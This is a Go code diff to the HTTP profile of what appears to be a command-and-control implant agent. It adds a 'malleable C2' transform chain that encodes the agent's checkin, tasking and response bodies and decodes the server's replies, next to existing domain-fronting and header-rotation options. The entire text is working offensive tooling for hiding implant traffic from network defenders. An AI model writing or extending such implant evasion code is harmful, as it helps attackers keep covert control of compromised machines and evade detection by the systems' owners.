@@ -66,6 +66,7 @@ type HTTPProfile struct {
 	HostHeader    string            // Override Host header for domain fronting
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	ContentTypes  []string          // Content-Type rotation pool for request body
+	Transforms    *TransformChain  // Optional body transform chain (Phase 2 malleable C2)
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
@@ -346,8 +347,17 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	messageData := append([]byte(agent.PayloadUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
+	// Apply body transforms if configured (malleable C2 Phase 2)
+	outData := []byte(encodedData)
+	if h.Transforms != nil {
+		outData, err = h.Transforms.Encode(outData)
+		if err != nil {
+			return fmt.Errorf("body transform encode failed: %w", err)
+		}
+	}
+
 	// Send checkin request to configured endpoint
-	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, outData, cfg)
 	if err != nil {
 		return fmt.Errorf("checkin request failed: %w", err)
 	}
@@ -361,6 +371,14 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	respBody, err := readResponseBody(resp)
 	if err != nil {
 		return fmt.Errorf("failed to read checkin response: %w", err)
+	}
+
+	// Reverse body transforms if configured (malleable C2 Phase 2)
+	if h.Transforms != nil {
+		respBody, err = h.Transforms.Decode(respBody)
+		if err != nil {
+			return fmt.Errorf("body transform decode failed: %w", err)
+		}
 	}
 
 	// Decrypt the checkin response if needed
@@ -465,7 +483,16 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
+	// Apply body transforms if configured (malleable C2 Phase 2)
+	outData := []byte(encodedData)
+	if h.Transforms != nil {
+		outData, err = h.Transforms.Encode(outData)
+		if err != nil {
+			return nil, nil, fmt.Errorf("body transform encode failed: %w", err)
+		}
+	}
+
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, outData, cfg)
 	if err != nil {
 		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
@@ -478,6 +505,14 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	respBody, err := readResponseBody(resp)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
+	}
+
+	// Reverse body transforms if configured (malleable C2 Phase 2)
+	if h.Transforms != nil {
+		respBody, err = h.Transforms.Decode(respBody)
+		if err != nil {
+			return nil, nil, fmt.Errorf("body transform decode failed: %w", err)
+		}
 	}
 
 	// Decrypt the response if encryption key is provided
@@ -726,7 +761,16 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", cfg.PostEndpoint, []byte(encodedData), cfg)
+	// Apply body transforms if configured (malleable C2 Phase 2)
+	outData := []byte(encodedData)
+	if h.Transforms != nil {
+		outData, err = h.Transforms.Encode(outData)
+		if err != nil {
+			return nil, fmt.Errorf("body transform encode failed: %w", err)
+		}
+	}
+
+	resp, err := h.makeRequest("POST", cfg.PostEndpoint, outData, cfg)
 	if err != nil {
 		return nil, fmt.Errorf("post response request failed: %w", err)
 	}
@@ -740,6 +784,14 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
+	}
+
+	// Reverse body transforms if configured (malleable C2 Phase 2)
+	if h.Transforms != nil {
+		respBody, err = h.Transforms.Decode(respBody)
+		if err != nil {
+			return nil, fmt.Errorf("body transform decode failed: %w", err)
+		}
 	}
 
 	// Decrypt the response if encryption key is provided (same as GetTasking)
